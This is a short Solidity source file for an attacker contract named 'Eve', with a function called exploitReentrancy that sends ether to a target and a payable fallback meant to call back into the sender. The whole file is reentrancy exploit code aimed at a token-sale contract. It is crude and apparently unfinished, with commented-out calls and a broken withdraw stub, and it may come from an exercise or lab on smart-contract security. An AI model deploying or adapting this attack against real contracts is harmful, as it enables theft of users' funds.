pragma solidity ^0.4.19;

contract Eve {

  
       bool alreadyCalled = false;
       uint tokenAmount = 0;
   
    
    
    
    function exploitReentrancy(address a, uint amount) public {
        //a.call(bytes4(sha3("buyTokens(address _beneficiary)")), this.owner);
        tokenAmount = amount;
        a.call.value(amount)();
        
    }

   /* function() withdraw public onlyOwner () {
        token.transfer(msg.sender, token.balances[this.address]);
    }*/


    
    function() payable public {
        if(alreadyCalled == true) {
            return;
       }
       // msg.sender.call(bytes4(sha3("buyTokens(address _beneficiary)")), this.owner);
        msg.sender.call.value(tokenAmount)();
        alreadyCalled = true;
        
        
    }
}
